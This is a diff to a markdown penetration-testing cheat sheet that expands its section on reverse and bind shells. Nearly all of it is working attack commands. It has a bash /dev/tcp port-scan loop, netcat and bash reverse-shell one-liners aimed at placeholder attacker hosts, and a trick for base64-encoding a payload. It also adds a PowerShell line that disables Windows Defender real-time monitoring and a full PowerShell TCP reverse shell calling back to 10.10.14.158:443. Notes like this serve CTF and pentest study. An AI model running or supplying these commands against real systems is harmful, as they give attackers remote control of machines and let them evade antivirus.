@@ -105,25 +105,44 @@ for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo
 
 ## Shells
 - Reverse:
-  - [Atacker] LISTENER <---------[Victim]
-- - Binding:
-  - [Victim] LISTENER <---------[Atacker]
+  - **Atacker** LISTENER <--------- **Target**
+  - [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- Bind
+  - **Atacker** LISTENER ---------> **Target**
 
 - **Connect**
   - -u = UDP connection
-  - nc <LOCAL-IP> <PORT> -e /bin/bash
-  - nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
-  - nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
-  - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
-  - rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f
+  
+```
+nc $ATTACKER 1234 -e /bin/bash
+nc DEST_IP DEST_PORT -c "/bin/bash 2>&1"
+nc DEST_IP DEST_PORT | /bin/bash 2>&1 | nc DEST_IP DEST_PORT+1
+mkfifo /tmp/f; nc $ATTACKER 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $TARGET 1234 >/tmp/f
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234 > /tmp/f
+```
+
   - **No NC**:
-    - bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
-    - bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
-    - bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
-  - Encode to base64 for oneliner + decode
-    - echo -n 'bash -c "bash -i >& /dev/tcp/ATTACKING_IP/ATTACKING_PORT 0>&1"' | base64
-    - echo base64encoded== | base64 -d | sh/bash
-  - Try different shels /bin/bash | sh
+
+```
+bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
+bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
+bash -i >& /dev/tcp/DEST_IP/DEST_PORT 0>&1
+
+# Encode to base64 for oneliner + decode
+echo -n 'bash -c "bash -i >& /dev/tcp/ATTACKING_IP/ATTACKING_PORT 0>&1"' | base64
+echo base64encoded== | base64 -d | sh/bash
+
+# Try different shels /bin/bash | sh
+``` 
+  - **Powershell**
+```
+# Disable antivirus
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Shell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 - **Reverse shell**
   - [More shells](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
 
